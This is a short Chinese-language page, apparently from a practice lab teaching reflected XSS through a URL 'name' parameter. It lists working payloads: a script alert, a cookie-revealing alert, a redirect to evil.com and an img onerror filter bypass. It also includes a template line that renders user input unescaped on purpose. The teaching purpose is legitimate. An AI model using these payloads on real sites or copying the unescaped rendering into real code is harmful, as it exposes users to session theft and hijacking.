💉 反射型 XSS（跨站脚本攻击）

通过 URL 参数注入 JavaScript，直接在页面上执行。

💡 提示：在 URL 后面加 ?name=你的内容 来测试
点击展开更多
  • 基础弹窗：?name=<script>alert('XSS')</script>
  • 窃取 Cookie：?name=<script>alert(document.cookie)</script>
  • 页面跳转：?name=<script>location.href='http://evil.com'</script>
  • 绕过过滤：?name=<img src=x onerror=alert(1)>

输出（未过滤，直接渲染用户输入）：

你好，{{ name|safe if name else '请先输入名字' }}
